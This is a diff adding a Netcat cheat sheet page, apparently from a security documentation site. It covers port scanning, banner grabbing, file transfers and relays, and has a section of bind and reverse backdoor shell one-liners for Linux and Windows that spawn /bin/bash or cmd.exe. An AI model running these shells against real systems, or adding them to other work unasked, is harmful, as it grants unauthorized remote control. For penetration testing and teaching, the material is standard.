@@ -1,0 +1,157 @@
+---
+title: Netcat Cheatsheet 
+description: CheatSheet
+---
+<Callout>Netcat (`nc`) is a powerful networking tool used for various tasks, including port scanning, banner grabbing, file transfers, and creating backdoor shells. This cheat sheet covers essential commands and techniques.</Callout>
+
+#### Basic Syntax
+
+```bash
+$ nc [options] [TargetIPaddr] [port(s)]
+```
+
+- **`[TargetIPaddr]`**: The IP address or domain name of the target. Required in client mode, optional in listen mode.
+
+#### Common Options
+
+- **`-l`**: Listen mode (default is client mode).
+- **`-L`**: Listen harder (Windows only). Makes Netcat a persistent listener that restarts after a client disconnects.
+- **`-u`**: UDP mode (default is TCP).
+- **`-p`**: Local port (In listen mode, the port Netcat listens on. In client mode, the source port for outgoing packets).
+- **`-e`**: Program to execute after connection, linking STDIN and STDOUT to the program.
+- **`-n`**: Avoid DNS lookups.
+- **`-z`**: Zero-I/O mode. No data is sent; only a connection attempt is made.
+- **`-wN`**: Timeout for connects. Waits `N` seconds after closure of STDIN.
+- **`-v`**: Verbose mode. Prints messages on STDERR.
+- **`-vv`**: Very verbose mode. Prints even more details.
+
+#### Fundamental Commands
+
+#### Netcat Client
+
+Connect to a specific port on a target IP address:
+
+```bash
+$ nc [TargetIPaddr] [port]
+```
+
+#### Netcat Listener
+
+Create a listener on a specific local port:
+
+```bash
+$ nc -l -p [LocalPort]
+```
+
+#### Port Scanning
+
+Perform a port scan on a target IP address:
+
+```bash
+$ nc -v -n -z -w1 [TargetIPaddr] [start_port]-[end_port]
+```
+
+- **`-v`**: Verbose output.
+- **`-n`**: No DNS resolution.
+- **`-z`**: Zero-I/O mode.
+- **`-w1`**: 1-second timeout.
+
+#### TCP Banner Grabbing
+
+Grab the banner of a TCP service:
+
+```bash
+$ echo "" | nc -v -n -w1 [TargetIPaddr] [port]
+```
+
+Add `-r` to randomize ports within a range or `-p [port]` to specify a source port.
+
+#### File Transfers
+
+#### Push a File from Client to Listener
+
+On the listener:
+
+```bash
+$ nc -l -p [LocalPort] > [outfile]
+```
+
+On the client:
+
+```bash
+$ nc -w3 [TargetIPaddr] [port] < [infile]
+```
+
+#### Pull a File from Listener Back to Client
+
+On the listener:
+
+```bash
+$ nc -l -p [LocalPort] < [infile]
+```
+
+On the client:
+
+```bash
+$ nc -w3 [TargetIPaddr] [port] > [outfile]
+```
+
+#### Backdoor Shells
+
+#### Listening Backdoor Shell on Linux
+
+```bash
+$ nc -l -p [LocalPort] -e /bin/bash
+```
+
+#### Listening Backdoor Shell on Windows
+
+```bash
+C:\> nc -l -p [LocalPort] -e cmd.exe
+```
+
+#### Reverse Backdoor Shell on Linux
+
+```bash
+$ nc [YourIPaddr] [port] -e /bin/bash
+```
+
+#### Reverse Backdoor Shell on Windows
+
+```bash
+C:\> nc [YourIPaddr] [port] -e cmd.exe
+```
+
+#### Relays
+
+#### Listener-to-Client Relay (Windows)
+
+```bash
+C:\> echo nc [TargetIPaddr] [port] > relay.bat
+C:\> nc -l -p [LocalPort] -e relay.bat
+```
+
+#### Listener-to-Listener Relay (Linux)
+
+Create a FIFO named pipe called `backpipe`:
+
+```bash
+$ cd /tmp
+$ mknod backpipe p
+```
+
+Then, use:
+
+```bash
+$ nc -l -p [LocalPort_1] 0<backpipe | nc -l -p [LocalPort_2] | tee backpipe
+```
+
+#### Client-to-Client Relay (Linux)
+
+```bash
+$ nc [PreviousHopIPaddr] [port] 0<backpipe | nc [NextHopIPaddr] [port2] | tee backpipe
+```
+
+
+
+
